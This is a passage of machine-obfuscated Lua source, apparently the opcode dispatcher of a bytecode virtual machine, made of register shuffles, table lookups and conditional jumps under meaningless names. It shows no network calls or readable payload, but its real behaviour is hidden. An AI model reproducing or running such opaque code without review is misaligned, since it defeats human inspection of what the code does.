w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 9<ba then w[y[514]]=h[y[14]];else y=f[n];end end else if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if 13<ba then n=n+1;else w[y[514]]={};end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if 16<ba then n=n+1;else w[y[514]]={};end end else if ba<=19 then if ba==18 then y=f[n];else w[y[514]][y[14]]=w[y[463]];end else if ba~=21 then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if 23>ba then w[y[514]]=j[y[14]];else n=n+1;end else if 24<ba then w[y[514]]=w[y[14]][y[463]];else y=f[n];end end else if ba<=27 then if ba>26 then y=f[n];else n=n+1;end else if 29>ba then if w[y[514]]then n=n+1;else n=y[14];end;else break end end end end end ba=ba+1 end elseif z<123 then if not w[y[514]]then n=n+1;else n=y[14];end;else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])end;elseif 126>=z then if 124>=z then local ba=w[y[463]];if ba then n=n+1;else w[y[514]]=ba;n=y[14];end;elseif z>125 then w[y[514]]=h[y[14]];else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif z<=127 then w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];elseif 128<z then w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 135>=z then if 132>=z then if 130>=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z~=132 then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()end;elseif z<=133 then if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;elseif z~=135 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else if(w[y[514]]<=w[y[463]])then n=n+1;else n=y[14];end;end;elseif z<=138 then if 136>=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif z<138 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514];do return w[ba](r(w,ba+1,y[14]))end;n=n+1;y=f[n];ba=y[514];do return r(w,ba,p)end;else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()end;elseif z<=139 then if(w[y[514]]<w[y[463]])then n=n+1;else n=y[14];end;elseif z>140 then j[y[14]]=w[y[514]];else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=165 then if 153>=z then if z<=147 then if 144>=z then if z<=142 then w[y[514]][w[y[14]]]=w[y[463]];elseif z==143 then if(y[514]<w[y[463]])then n=n+1;else n=y[14];end;else w[y[514]]=w[y[14]][y[463]];end;elseif 145>=z then local ba;local bb;local bc;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[14];bb=y[463];ba=k(w,g,bc,bb);w[y[514]]=ba;elseif z~=147 then local ba=y[514];local bb=w[ba];for bc=ba+1,y[14]do t(bb,w[bc])end;else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=150 then if z<=148 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif z==149 then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 151>=z then w[y[514]]=w[y[14]]+w[y[463]];elseif 152<z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()end;elseif 159>=z then if 156>=z then if z<=154 then local ba=y[514]local bb={w[ba](r(w,ba+1,y[14]))};local bc=0;for bd=ba,y[463]do bc=bc+1;w[bd]=bb[bc];end;elseif 156>z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 157>=z then local ba;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()elseif z~=159 then local ba=y[14];local bb=y[463];local ba=k(w,g,ba,bb);w[y[514]]=ba;else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[14];bb=y[463];ba=k(w,g,bc,bb);w[y[514]]=ba;end;elseif z<=162 then if 160>=z then if(w[y[514]]~=w[y[463]])then n=y[14];else n=n+1;end;elseif z<162 then w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];else w[y[514]]=y[14];end;elseif 163>=z then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])elseif 164==z then w[y[514]]=w[y[14]]+y[463];else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=177 then if 171>=z then if 168>=z then if z<=166 then w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];elseif 167==z then local ba=y[514]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[14];bb=y[463];ba=k(w,g,bc,bb);w[y[514]]=ba;end;elseif z<=169 then local ba;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()elseif z==170 then w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=174 then if 172>=z then w[y[514]]={r({},1,y[14])};elseif z~=174 then local ba;local bb;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={r({},1,y[14])};n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];bb=y[514];ba=w[bb];for bc=bb+1,y[14]do t(ba,w[bc])end;else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 175>=z then local ba=y[514];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[14];w[ba+3]=bb;end;elseif z<177 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])else w[y[514]]=true;end;elseif z<=183 then if 180>=z then if 178>=z then local ba=y[514];do return r(w,ba,p)end;elseif z~=180 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()end;elseif 181>=z then if w[y[514]]then n=(n+1);else n=y[14];end;elseif z==182 then n=y[14];else w[y[514]]=false;end;elseif z<=186 then if z<=184 then w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;elseif 186>z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=187 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif 189>z then local ba=y[514];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;else w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;end;elseif z<=284 then if 236>=z then if z<=212 then if z<=200 then if z<=194 then if z<=191 then if z~=191 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=192 then w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;elseif z>193 then w[y[514]]=w[y[14]][w[y[463]]];else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif 197>=z then if z<=195 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;elseif 196==z then w[y[514]]=w[y[14]][y[463]];else local ba;local bb;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={r({},1,y[14])};n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];bb=y[514];ba=w[bb];for bc=bb+1,y[14]do t(ba,w[bc])end;end;elseif z<=198 then local ba=y[514];w[ba]=w[ba]-w[ba+2];n=y[14];elseif z<200 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 206>=z then if z<=203 then if z<=201 then local ba=y[514]w[ba]=w[ba](w[(ba+1)])elseif z==202 then local ba;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else w[y[514]]=false;end;elseif z<=204 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif 205<z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba](r(w,ba+1,y[14]))end;elseif 209>=z then if 207>=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif 209>z then if(y[514]<=w[y[463]])then n=n+1;else n=y[14];end;else w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;end;elseif 210>=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif z<212 then local 